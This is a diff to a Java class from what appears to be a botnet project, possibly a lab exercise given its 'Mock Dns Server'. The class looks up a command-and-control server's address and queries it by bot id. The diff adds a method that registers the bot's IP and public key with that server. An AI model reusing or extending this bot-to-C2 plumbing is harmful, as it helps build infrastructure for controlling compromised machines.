@@ -25,6 +25,7 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.lang.reflect.Type;
+import java.security.PublicKey;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.Future;
@@ -90,15 +91,11 @@ public class AsyncRequest {
 	//da valutare se devono essere asincroni
 	public IP getIpCommandAndControlFromDnsServer(String dnsUrl) {
 		IP requestIp=new IP("");
-		//String postRequest = "{\"user_ip\":\"" + myIp.getIp() + ":8080\"}";
 		Type type = new TypeToken<IP>() {}.getType();
 		try {
-			//requestIp = doPost(dnsUrl, postRequest);
 			requestIp=doGetJSON(dnsUrl,type);
 			
-			//System.out.println("getIpFromEntryPoint get RequestIp " + requestIp);
 		} catch (Exception e) {
-//			e.printStackTrace();
 			System.err.println("Errore ricezione Ip da Mock Dns Server");
 		}
 		return requestIp;
@@ -125,6 +122,30 @@ public class AsyncRequest {
 		}
 		return null;
 	}
+	
+	
+	//TODO da modificare
+	//da valutare se devono essere asincroni
+	public Boolean sendInfoToDnsServer(String dnsUrl,IP myIp,PublicKey myPublicKey){
+		Pairs<IP,PublicKey> data = new Pairs<>();
+		data.setValue1(myIp);
+		data.setValue2(myPublicKey);
+		Boolean response=false;
+		Integer counter = 0;
+		while (counter <= REQNUMBER) {
+		try {
+			String url=HTTPS+dnsUrl+PORT+"/alter/";
+			response=restTemplate.postForObject(url, data,response.getClass());
+			return response;
+		} catch (Exception e) {
+			counter++;
+			System.out.println("Errore Aggiornamento DNS");
+		}		
+		}
+		return response;
+	}
+	
+	
 	
 	//da valutare se devono essere asincroni
 	public String getResponseFromCommandAndConquer(String idBot,String Mac,IP dest,String hashMac){
